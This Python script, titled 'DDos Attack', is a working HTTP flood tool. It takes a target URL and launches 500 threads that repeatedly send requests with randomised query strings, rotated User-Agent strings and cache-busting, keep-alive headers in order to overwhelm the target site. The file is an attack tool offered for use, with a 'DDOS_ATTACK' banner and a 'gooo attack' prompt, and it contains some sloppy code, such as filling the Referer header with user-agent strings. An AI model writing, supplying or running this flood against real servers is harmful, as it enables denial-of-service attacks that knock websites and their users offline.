### DDos Attack

import re,threading,sys,random,time
import urllib.request, urllib.error
import signal
import pyfiglet


## class of color

class Color:

   PURPLE = '\033[95m'

print(Color.PURPLE)



## global variables

url = ''
host = ''
header_of_user_agent = []
header_of_referer = []
counter_of_requests = 0
flag = 0
safe = 0



## functions
def siganl_handler(sig,frame):
    print("Exit script..........")
    sys.exit(0)



signal.signal(signal.SIGINT, siganl_handler)

def set_flag(val):
	global flag
	flag=val



def block_of_strings(size):
    out_str = ''
    for i in range(0,size):
        a = random.randint(50,65)
        out_str+= chr(a)
    return(out_str)




def inc_request():
    global counter_of_requests
    counter_of_requests+=1



def list_of_agents():
    global header_of_user_agent
    header_of_user_agent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
    header_of_user_agent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    header_of_user_agent.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1)")
    header_of_user_agent.append("Mozilla/5.0 (X11; Linux i686; rv:102.0) Gecko/20100101 Firefox/102.0")
    header_of_user_agent.append("Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0")
    header_of_user_agent.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0")
    header_of_user_agent.append("Mozilla/5.0 (iPad; CPU OS 7_1_2 como Mac OS X) AppleWebKit/537.51.2 (KHTML, como Gecko) Versión/7.0 Mobile/11D257 Safari/9537.53")
    header_of_user_agent.append("Mozilla/5.0 (Windows NT 6.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0")
    header_of_user_agent.append("Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; rv:11.0) como Gecko")
    header_of_user_agent.append("Mozilla/5.0 (iPad; CPU OS 7_1 como Mac OS X) AppleWebKit/537.51.2 (KHTML, como Gecko) Versión/7.0 Mobile/11D167 Safari/9537.53")
    return(header_of_user_agent)



def list_of_referer():

    global header_of_referer
    header_of_referer.append('http://www.google.com/?q=')
    header_of_referer.append('http://www.usatoday.com/search/results?q=')
    header_of_referer.append('http://engadget.search.aol.com/search?q=')
    header_of_referer.append('http://' + host + '/')
    return(header_of_referer)



def usage():
    time.sleep(0.5)
    view = pyfiglet.figlet_format("DDOS_ATTACK", font='slant')
    print(view)
    print("Use The Script With a url  FILE.py <url>  ")





def callhttp(url):

  

    list_of_agents()
    list_of_referer()
    code = 0
    if url.count('?')>0:
        param_joiner = "&"
    else:
        param_joiner = "?"
    
    request = urllib.request.Request(url + param_joiner + block_of_strings(random.randint(3,10)) + '=' + block_of_strings(random.randint(3,10)) )
    request.add_header('User-Agent', random.choice(header_of_user_agent))
    request.add_header('Cache-Control','no-cache')
    request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
    request.add_header('Referer',random.choice(header_of_user_agent) + block_of_strings(random.randint(5,10)))  
    request.add_header('Keep-Alive', random.randint(110,120)) 
    request.add_header('Connection','keep-alive')
    request.add_header('Host',host)
    try:
        urllib.request.urlopen(request)
    
    except urllib.error.HTTPError:
        count_id = 0
        set_flag(1)
        print('response is code 500' + str(count_id),end=" ")
        count_id+=1
        code=500

    
    except urllib.error.URLError:
        sys.exit()

    
    else:
        inc_request()
        urllib.request.urlopen(request)
    return(code)


class http_thread(threading.Thread):
    def run(self):
        try:

            while flag<2:
                result=callhttp(url)
                if result == 500 and safe == 1:
                    set_flag(2)
        except Exception as e :
            pass


if len(sys.argv) < 2:
    usage()
    sys.exit()

else:
    if sys.argv[1] == "help":
        usage()
        sys.exit()
    else:
        result = pyfiglet.figlet_format("Geeks For Geeks")
        print("gooo attack")
        url = sys.argv[1]
        if url.count("/")==2:
            url = url + "/"
            
        m = re.search('(https?\://)?([^/]*)/?.*', url)
        host =  m.group(2)
        for i in range(500):
            t = http_thread()
            t.start()

